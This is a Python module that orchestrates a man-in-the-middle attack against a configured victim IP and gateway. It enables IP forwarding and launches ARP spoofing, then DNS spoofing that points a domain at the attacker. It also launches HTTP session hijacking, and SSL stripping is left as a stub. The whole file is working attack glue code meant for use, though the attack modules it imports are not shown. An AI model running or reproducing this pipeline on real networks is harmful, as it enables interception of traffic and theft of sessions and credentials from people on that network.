"""
src/core/mitm_pipeline.py: Orchestrates MITM attacks.
"""

import time
import os

from src.attacks.arp_spoofing import start_arp_spoof
from src.attacks.dns_spoofing import DnsSpoofingAttack
from src.attacks.HTTP_session_hijacking import HTTPSessionHijacker
from .config import load_config
from .network import enable_ip_forwarding


def teardown_pipeline(running_threads: dict):
    """Stops all attack threads + disables IP forwarding."""
    print("\n[INFO] Starting MITM teardown...")

    for name, thread in running_threads.items():
        if thread.is_alive():
            print(f"[INFO] Stopping {name}...")
            thread.stop()
            thread.join(timeout=5)

    # Disable IP forwarding
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('0')
        print("[INFO] IP forwarding disabled.")
    except Exception as e:
        print(f"[ERROR] Failed disabling IP forwarding: {e}")

    print("[INFO] Teardown complete.")


def run(mode: str):
    """Runs the MITM pipeline."""
    config = load_config()
    running_threads = {}

    try:
        # IP forwarding
        if not enable_ip_forwarding():
            raise RuntimeError("IP forwarding could not be enabled!")

        victim_ip = config["victim"]["ip"]
        gateway_ip = config["gateway"]["ip"]
        attacker_iface = config["attacker"]["interface"]
        attacker_ip = config["attacker"]["ip"]
        domain_name = config["domain"]["name"]

        # --- ARP Spoofing Required for All Attacks ---
        if any(x in mode for x in ["arp", "dns", "ssl", "session"]):
            arp_spoofer = start_arp_spoof(victim_ip, gateway_ip, attacker_iface)
            if not arp_spoofer:
                raise RuntimeError("ARP Spoofer failed to start.")
            running_threads["arp"] = arp_spoofer

        # --- DNS Spoofing ---
        if "dns" in mode:
            dns_spoofer = DnsSpoofingAttack(domain=domain_name, fake_ip=attacker_ip)
            dns_spoofer.start()
            running_threads["dns"] = dns_spoofer

        # --- SSL Stripping (not implemented yet) ---
        if "ssl" in mode:
            print("[WARNING] SSL stripping not implemented.")

        # --- HTTP Session Hijacking ---
        if "session" in mode:
            hijacker = HTTPSessionHijacker(
                target_domain=domain_name,
                target_ip=attacker_ip,
                victim_ip=victim_ip,
                interface=attacker_iface,
            )
            hijacker.start()
            running_threads["session"] = hijacker

        # Keep alive
        print(f"\n[INFO] MITM pipeline running: {list(running_threads.keys())}")
        print("[INFO] Press Ctrl+C to stop.\n")

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[INTERRUPT] Ctrl+C pressed by user.")
    except Exception as e:
        print(f"[FATAL ERROR] {e}")
    finally:
        teardown_pipeline(running_threads)


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 -m src.core.mitm_pipeline <mode>")
        print("Modes: arp, dns, session, ssl")
        sys.exit(1)

    mode = sys.argv[1]
    run(mode)
